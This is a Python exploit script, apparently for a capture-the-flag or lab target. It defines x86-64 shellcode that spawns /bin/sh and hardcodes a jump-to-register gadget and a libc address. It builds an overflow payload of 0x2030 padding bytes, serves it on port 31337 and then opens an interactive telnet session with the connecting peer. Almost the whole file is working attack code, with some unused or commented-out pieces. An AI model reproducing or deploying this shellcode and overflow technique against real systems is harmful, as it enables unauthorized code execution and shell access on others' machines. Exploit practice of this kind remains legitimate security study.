#! /usr/bin/python

import sys
from struct import *
import socket
import telnetlib
import time
from signal import *

if sys.byteorder == 'little':
        Q = lambda x: pack("<Q", x)
        revQ = lambda x: unpack("<Q", x)[0]
elif sys.byteorder == 'big':
        Q = lambda x: pack(">Q", x)
        revQ = lambda x: unpack(">Q", x)[0]

shellcode = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6" + \
            "\x48\x31\xff\x50\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + \
            "\x53\x48\x8d\x54\x24\x0a\x48\x8d\x74\x24\x08\x48\x8d\x3c\x24" + \
            "\xb0\x3b\x0f\x05"

# no need to hardcode %rsp address, just jump it...
# 0x00400877: jmpq *%rax ;
jmp_to_stack = Q(0x00400877)

# before fopen
before_fopen_call = pack("<I", 0x0000000000400aa0)

# libc_sleep
libc_sleep = Q(0x7ffff7ad9800)

# payload = socket.inet_ntoa(before_fopen_call) + chr(0x0a)
# payload += "31337" + chr(0x0a)
coeg = 0x2030
payload = libc_sleep + "\x41"*(0x2030 + 12)

open("/tmp/pl", "w").write(payload)

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
except socket.error as e:
        (n, q) = e

        print "Error: " + q + ", Errno: " + str(n)

        sys.exit(-1)

try:
        s.bind(('', 31337))
except socket.error as e:
        (n, q) = e

        print "Error: " + q + ", Errno: " + str(n)

        sys.exit(-1)

try:
        s.listen(0)
except socket.error as e:
        (n, q) = e

        print "Error: " + q + ", Errno: " + str(n)

        sys.exit(-1)

try:
        (f, g) = s.accept()
except socket.error as e:
        (n, q) = e

        print "Error: " + q + ", Errno: " + str(n)

        sys.exit(-1)

try:
        f.send(payload)
except socket.error as e:
        (n, q) = e

        print "Error: " + q + ", Errno: " + str(n)

        sys.exit(-1)

t = telnetlib.Telnet()
t.sock = f
t.interact()
